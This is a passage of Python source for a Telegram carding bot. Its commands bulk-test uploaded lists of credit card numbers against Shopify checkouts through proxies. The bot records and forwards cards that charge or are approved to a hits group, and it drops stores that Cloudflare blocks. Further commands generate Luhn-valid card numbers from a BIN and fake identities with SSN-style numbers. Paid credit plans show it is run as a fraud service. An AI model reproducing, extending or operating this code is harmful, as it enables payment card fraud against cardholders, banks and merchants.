                    await sent_msg.edit(current_msg, parse_mode='Markdown', link_preview=False)
                except Exception as e:
                    print(f"[MSH] Error editing message: {e}")
                
                # Small delay to avoid flood limits
                if completed_count < len(cards) and not stopped_early:
                    await asyncio.sleep(0.3)
        
    finally:
        # Remove process lock
        ACTIVE_MSH_PROCESSES.pop(user_id, None)

async def process_individual_result(event, card, result, response_time, site, site_index):
    """Process individual card result with timing info"""
    try:
        if isinstance(result, Exception):
            result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

        elapsed_time = round(response_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = result.get("Response", "").lower()
        
        # Handle r4 token empty error
        if "r4 token empty" in response_text or "r4 token is empty" in response_text:
            result["Response"] = "INCORRECT_NUMBER"
            response_text = "incorrect_number"
        
        if "cloudflare bypass failed" in response_text:
            status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            result["Response"] = "Cloudflare spotted 🤡 change site or try again"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            await save_approved_card(card, status_result, result.get('Response'), result.get('Gateway'), result.get('Price'))
            # Forward to Hits Group (Thank you responses)
            await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, event.sender_id, "mtxt")
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
            await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            # Forward to Hits Group only for INCORRECT_ZIP responses
            if "incorrect_zip" in response_text:
                await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, event.sender_id, "mtxt")
        else:
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            status_result = "Declined"
        
        # Determine status text
        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header:
            status_display = "`Charged 💎`"
        elif "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
            status_display = "APPROVED ✅"
        elif "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀" in status_header:
            status_display = "CLOUDFLARE ⚠️"
        else:
            status_display = "Failed ❌"
        
        # Clean format with bold labels
        card_msg = f"""```
✦ [$msh] [ #Auto_Shopify ]
```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {result.get('Response')}
**Price** → {result.get('Price')} 💸
**Site** → {site_index + 1}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}

Elapsed time: {elapsed_time} seconds"""
        result_msg = await event.reply(card_msg, parse_mode='Markdown', link_preview=False)
        if "thank you" in response_text or "payment successful" in response_text: 
            await pin_charged_message(event, result_msg)
        await asyncio.sleep(0.1)
    except Exception as e:
        print(f"Error processing individual result: {e}")

async def ptxt(event):
    """Proxy-based text file card check using ravenxchecker.site API"""
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("ptxt"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    print(f"[MSH] can_access={can_access}, access_type={access_type}")
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        print(f"[MSH] ❌ Access denied! can_access={can_access}")
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    print(f"[MSH] ✅ Access granted! Proceeding with command...")
    
    # Check if user has Pro plan for /ptxt access (only Pro, not Premium)
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        user_data = await get_user_credits(user_id)
        plan = user_data.get('plan', 'Free')
        if plan != 'Pro':
            return await event.reply("❌ **Pro Plan Required!**\n\n/ptxt command requires Pro plan only.\n\n🔥 Contact [𝘼𝙆](https://t.me/Akbhai007) to upgrade to Pro plan!", link_preview=False)
    
    proxy_url = get_proxy(user_id)
    if not proxy_url:
        return await event.reply("❌ **No proxy set!**\n\nPlease set a proxy first using `/setpx` command.\n\n**Format**: /setpx ip:port:user:pass\n**Example**: /setpx shopifywala.com:6969:user:pass", link_preview=False)
    
    if user_id in ACTIVE_MTXT_PROCESSES: 
        return await event.reply("```𝙔𝙤𝙪𝙧 𝙘𝙖𝙧𝙙 𝙞𝙨 𝙘𝙤𝙤𝙠𝙞𝙣𝙜! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙝𝙤𝙡𝙙 𝙤𝙣...```", link_preview=False)
    
    try:
        if not event.reply_to_msg_id: 
            return await event.reply("❌ Please reply to a document message with /ptxt", link_preview=False)
        
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: 
            return await event.reply("❌ Please reply to a document message with /ptxt", link_preview=False)
        
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: 
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}", link_preview=False)
        
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: 
            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 ??𝙤𝙪𝙣𝙙 🥲", link_preview=False)
        
        cc_limit = get_mtxt_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 ✅```""", link_preview=False)
        else: 
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 ✅```""", link_preview=False)
        
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: 
            return await event.reply("𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗", link_preview=False)
        
        # Check if user has enough credits (skip for admin)
        if user_id not in ADMIN_ID:
            user_data = await get_user_credits(user_id)
            available_credits = user_data.get('credits', 0)
            required_credits = len(cards)
            
            if available_credits < required_credits:
                return await event.reply(
                    f"❌ Insufficient Credits!\n\n(Free check available in group)"
                , link_preview=False)
        
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_ptxt_cards(event, cards, user_sites.copy()))
        
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ Error: {e}", link_preview=False)

async def process_ptxt_cards(event, cards, local_sites):
    """Process proxy-based text file card checking"""
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    removed_sites = []
    site_dead_count = {}
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```", link_preview=False)
    cards_per_site = 4
    current_site_index = 0
    cards_on_current_site = 0

    try:
        batch_size = 30  # Increased to 30 for faster processing
        for i in range(0, len(cards), batch_size):
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                # Update status message to show stopped
                try: 
                    await status_msg.edit("```⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!```")
                except: pass
                
                # Send NEW summary message
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 🗑️ : {len(removed_sites)}"""

                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], 
                                [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], 
                                [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                
                try: await event.reply(final_caption, buttons=final_buttons, link_preview=False)
                except: pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                    break
                current_site = local_sites[current_site_index]
                tasks.append(check_card_proxy_api_specific_site(card, current_site, event.sender_id))
                task_cards.append((card, current_site_index))
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(local_sites)
                    cards_on_current_site = 0
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_index)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
                
                # Check if result is None or invalid
                if not result or not isinstance(result, dict):
                    result = {"Response": "API Error - Invalid response", "Price": "-", "Gateway": "-"}

                checked += 1
                
                # Deduct 1 credit for each CC checked (skip for admin)
                if user_id not in ADMIN_ID:
                    success, remaining = await deduct_user_credits(user_id, 1, "/ptxt", event.chat_id)
                    if not success:
                        # If credit deduction fails, stop processing
                        print(f"[PTXT] Credit deduction failed for user {user_id}, stopping...")
                        break
                
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                
                # Clean response - remove proxy info if present
                raw_response = result.get("Response", "")
                if "@" in raw_response or re.search(r'\d+\.\d+\.\d+\.\d+:\d+', raw_response):
                    result["Response"] = "Card Declined"
                
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                
                # Handle API errors with better messages
                if "py id empty" in response_text_lower or "product id is empty" in response_text_lower:
                    result["Response"] = "Site Dead - Product not found"
                elif "tax amount is empty" in response_text_lower:
                    result["Response"] = "Site Dead - Tax not configured"
                elif "api_error_504" in response_text_lower:
                    result["Response"] = "API Gateway Timeout"
                elif "api_error" in response_text_lower:
                    result["Response"] = "API Error"
                
                # Fix IndexError by checking bounds
                if site_index >= len(local_sites):
                    site_index = 0
                site_used = local_sites[site_index]

                # Check if site is dead
                if any(err in response_text_lower for err in ["site_error", "invalid_json", "exception", "timeout", "cloudflare bypass failed", "tax amount is empty", "api_error", "r4 token empty", "hcaptcha detected", "del ammount empty", "del amount empty"]):
                    declined += 1
                    if site_used in local_sites:
                        # Check if it's cloudflare - remove immediately
                        if "cloudflare bypass failed" in response_text_lower:
                            removed_sites.append(site_used)
                            print(f"🗑️ REMOVED CLOUDFLARE SITE: {site_used}")
                            local_sites.remove(site_used)
                            current_site_index = 0
                            cards_on_current_site = 0
                        else:
                            # For other dead sites, count dead responses
                            if site_used not in site_dead_count:
                                site_dead_count[site_used] = 0
                            site_dead_count[site_used] += 1
                            
                            # Remove site only after 3 dead responses
                            if site_dead_count[site_used] >= 3:
                                removed_sites.append(site_used)
                                print(f"🗑️ REMOVED DEAD SITE (3 strikes): {site_used}")
                                local_sites.remove(site_used)
                                current_site_index = 0
                                cards_on_current_site = 0
                    
                    # Check if all sites are now dead
                    if not local_sites:
                        try: await status_msg.edit("```⛔ 𝘼𝙡𝙡 𝙎𝙞𝙩𝙚𝙨 𝘿𝙚𝙖𝙙!```")
                        except: pass
                        
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 🗑️ : {len(removed_sites)}"""
                        
                        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨! ➜ [{checked}/{total}] ⛔", b"none")]]
                        
                        try: await event.reply(final_caption, buttons=final_buttons, link_preview=False)
                        except: pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "3d" in response_text_lower:
                    result["Response"] = "3DS Authentications Required"
                    declined += 1
                    continue

                # Handle r4 token empty, hcaptcha, and amount errors
                if any(err in response_text_lower for err in ["r4 token empty", "r4 token is empty", "hcaptcha detected", "hcaptcha", "del ammount empty", "del amount empty"]):
                    result["Response"] = "INCORRECT_NUMBER"
                    response_text_lower = "incorrect_number"

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                if "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, user_id, "mtxt")
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if "incorrect_zip" in response_text_lower:
                        await forward_to_hits_group(card, result.get('Response'), result.get('Gateway'), result.get('Price'), site_index + 1, user_id, "mtxt")
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                if should_send_message:
                    # Determine status text
                    if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status_header:
                        status_display = "`Charged 💎`"
                    elif "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status_header:
                        status_display = "APPROVED ✅"
                    elif "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀" in status_header:
                        status_display = "CLOUDFLARE ⚠️"
                    else:
                        status_display = "Failed ❌"
                    
                    # Clean format with bold labels (same as /mtxt)
                    card_msg = f"""```✦ [$ptxt] [ #Proxy_Shopify ]```
**CC**: `{card}`
**Status**: {status_display}
**Response**: {result.get('Response')}
**Price** → {result.get('Price')} 💸
**Site** → {site_index + 1}
**Gateway** → {result.get('Gateway', 'Shopify Payments')}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}"""
                    result_msg = await event.reply(card_msg, link_preview=False)
                    if "thank you" in response_text_lower or "payment successful" in response_text_lower: 
                        await pin_charged_message(event, result_msg)
                
                # Update status message with buttons every 3 cards (optimized for speed)
                if checked % 3 == 0:
                    buttons = [[Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")], [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {result.get('Response')[:25]}...", b"none")], [Button.inline(f"𝗦𝗶𝘁𝗲 ➜ {site_index + 1}", b"none")], [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")], [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")], [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]]
                    try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚... ✅```", buttons=buttons)
                    except: pass
        
        # Update status message to show complete (remove buttons) - same as /mtxt
        try: await status_msg.edit("```✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!```")
        except: pass
        
        # Send NEW summary message - same as /mtxt
        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 🗑️ : {len(removed_sites)}"""

        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], 
                        [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], 
                        [Button.inline(f"𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚 ➜ [{total}] ✅", b"none")]]
        
        try:
            await event.reply(final_caption, buttons=final_buttons, link_preview=False)
        except: pass
        
    except Exception as e:
        print(f"Error in process_ptxt_cards: {e}")
        try:
            await event.reply(f"❌ Error: {e}", link_preview=False)
        except: pass
    finally: 
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
@require_membership
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

@client.on(events.NewMessage(pattern=r'^/sites(\s|$)'))
@require_membership
async def sites(event):
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("sites"):
        return
    
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message(), link_preview=False)
    
    user_id = event.sender_id
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    
    if user_sites:
        sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else:
        sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"
    
    sites_msg = f"""🌐 𝙔𝙤𝙪𝙧 𝙎𝙞𝙩𝙚𝙨 ({len(user_sites)}):

```
{sites_text}
```
"""
    
    # Check message length and truncate if too long
    if len(sites_msg) > 4000:
        max_sites_to_show = 1000
        if len(user_sites) > max_sites_to_show:
            sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites[:max_sites_to_show])])
            sites_text += f"\n... and {len(user_sites) - max_sites_to_show} more sites"
            
            sites_msg = f"""🌐 𝙔𝙤𝙪𝙧 𝙎𝙞𝙩𝙚𝙨 ({len(user_sites)}):

```
{sites_text}
```
"""
    
    await event.reply(sites_msg, link_preview=False)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen\s'))
@require_membership
async def gen(event):
    # Check if command is enabled
    if not is_command_enabled("gen"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message(), link_preview=False)
    
    try:
        # Extract user input (remove /gen or .gen)
        user_input = event.text[4:].strip()
        user_input = user_input.replace('/', '|')
        input_parts = user_input.split(' ')
        card_info = input_parts[0].strip()
        quantity_str = input_parts[1].strip() if len(input_parts) > 1 else "10"

        parts = card_info.split('|')
        bin_number = parts[0].strip() if len(parts) > 0 else ""
        mm_input = "xx" if len(parts) <= 1 or parts[1].strip().lower() == "rnd" else parts[1].strip()
        yy_input = "xx" if len(parts) <= 2 or parts[2].strip().lower() == "rnd" else parts[2].strip()
        cvv_input = "xxx" if len(parts) <= 3 or parts[3].strip().lower() == "rnd" else parts[3].strip()

        if not (len(bin_number) >= 6 and bin_number[:6].isdigit()):
            await event.reply("❌ Invalid BIN format.", link_preview=False)
            return

        try:
            quantity = int(quantity_str)
            if quantity <= 0 or quantity > 100:
                raise ValueError()
        except ValueError:
            await event.reply("❌ Max quantity is 100.", link_preview=False)
            return

        # Lookup BIN info
        bin_info = await lookup_bin(bin_number)
        if "error" in bin_info:
            bin_info = {
                "card_type": "NOT FOUND",
                "network": "NOT FOUND",
                "tier": "NOT FOUND",
                "bank": "NOT FOUND",
                "country": "NOT FOUND",
                "flag": "🏳️"
            }

        # Generate cards
        ccs = []
        for _ in range(quantity):
            card_number = generate_credit_card(bin_number)
            mm, yy = generate_expiry_date(mm_input, yy_input)
            cvv = generate_cvv(cvv_input, bin_number)
            ccs.append(f"{card_number}|{mm}|{yy}|{cvv}")

        ccs_text = '\n'.join([f"`{cc}`" for cc in ccs])

        # Build response
        response = f"""**𝐁𝐈𝐍** ⇾ {bin_number[:6]}
**𝐀𝐌𝐎𝐔𝐍𝐓** ⇾ {quantity}
━━━━━━━━━━━━━━
{ccs_text}
━━━━━━━━━━━━━━
**𝗜𝗻𝗳𝗼:** {bin_info.get('card_type')} - {bin_info.get('network')} - {bin_info.get('tier')}
**𝐈𝐬𝐬𝐮𝐞𝐫:** {bin_info.get('bank')}
**𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {bin_info.get('country')} {bin_info.get('flag')}
━━━━━━━━━━━━━━"""

        await event.reply(response, link_preview=False)

    except Exception as e:
        print(f"Error in /gen: {e}")
        await event.reply("❌ An error occurred while generating cards.", link_preview=False)

# === FAKE ADDRESS GENERATOR FUNCTIONS ===

def generate_luhn_valid_ssn():
    def luhn_checksum(number):
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10
    while True:
        ssn = random.randint(100000000, 999999999)
        if luhn_checksum(ssn) == 0:
            return f"{str(ssn)[:3]}-{str(ssn)[3:5]}-{str(ssn)[5:]}"

# === END FAKE ADDRESS GENERATOR FUNCTIONS ===

@client.on(events.NewMessage(pattern=r'(?i)^/fake\s'))
@require_membership
async def fake(event):
    # Check if command is enabled
    if not is_command_enabled("fake"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message(), link_preview=False)
    
    try:
        # Extract country from command
        country_input = event.text[5:].strip().lower()
        
        if not country_input:
            await event.reply("❌ Please provide a country code.\n\n**Examples:**\n/fake usa\n/fake ca\n/fake uk\n/fake in", link_preview=False)
            return
        
        # Send "Generating..." message first
        status_msg = await event.reply("🔄 Generating fake address...", link_preview=False)
        
        # Map country codes to Faker locales
        country_map = {
            'usa': 'en_US', 'us': 'en_US', 'united states': 'en_US', 'america': 'en_US',
            'ca': 'en_CA', 'canada': 'en_CA',
            'uk': 'en_GB', 'britain': 'en_GB', 'england': 'en_GB', 'united kingdom': 'en_GB',
            'in': 'en_IN', 'india': 'en_IN',
            'au': 'en_AU', 'australia': 'en_AU',
            'de': 'de_DE', 'germany': 'de_DE',
            'fr': 'fr_FR', 'france': 'fr_FR',
            'es': 'es_ES', 'spain': 'es_ES',
            'it': 'it_IT', 'italy': 'it_IT',
            'br': 'pt_BR', 'brazil': 'pt_BR',
            'mx': 'es_MX', 'mexico': 'es_MX',
            'jp': 'ja_JP', 'japan': 'ja_JP',
            'kr': 'ko_KR', 'korea': 'ko_KR',
            'cn': 'zh_CN', 'china': 'zh_CN',
            'ru': 'ru_RU', 'russia': 'ru_RU',
        }
        
        locale = country_map.get(country_input, 'en_US')
        fake = Faker(locale)
        
        # Generate data
        gender = random.choice(['Male', 'Female'])
        name = fake.name_male() if gender == 'Male' and hasattr(fake, 'name_male') else fake.name()
        street_address = fake.street_address()
        city = fake.city()
        postal_code = fake.postcode()
        
        try:
            if locale == 'en_US':
                province = fake.state()
            elif locale == 'en_CA':
                province = fake.province()
            elif locale == 'en_AU':
                province = fake.state()
            else:
                province = city
        except:
            province = city
        
        country_name = fake.current_country()
        phone = fake.phone_number()
        
        formatted_content = f"""**Name:** `{name}`
**Gender:** `{gender}`
**Street address:** `{street_address}`
**City:** `{city}`
**Postal Code:** `{postal_code}`
**Province:** `{province}`
**Country:** `{country_name}`
**Phone Number:** `{phone}`"""
        
        if locale == 'en_US':
            ssn = generate_luhn_valid_ssn()
            formatted_content += f"\n**Social Security Number:** `{ssn}`"
        
        await status_msg.edit(f"📍 **Fake Address Generated:**\n\n{formatted_content}")

        
    except Exception as e:
        print(f"Error in /fake: {e}")
        try:
            await status_msg.edit("❌ Error fetching address. Try again later.")
        except:
            await event.reply("❌ Error fetching address. Try again later.", link_preview=False)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]bin(\s|$)'))
@require_membership
async def bin_lookup_command(event):
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("bin"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message(), link_preview=False)
    
    try:
        # Extract BIN from command or reply
        bin_number = ""
        
        # Check if replying to a message
        if event.is_reply:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.text:
                # Extract card from replied message (handle multi-line)
                reply_text = replied_msg.text.strip()
                
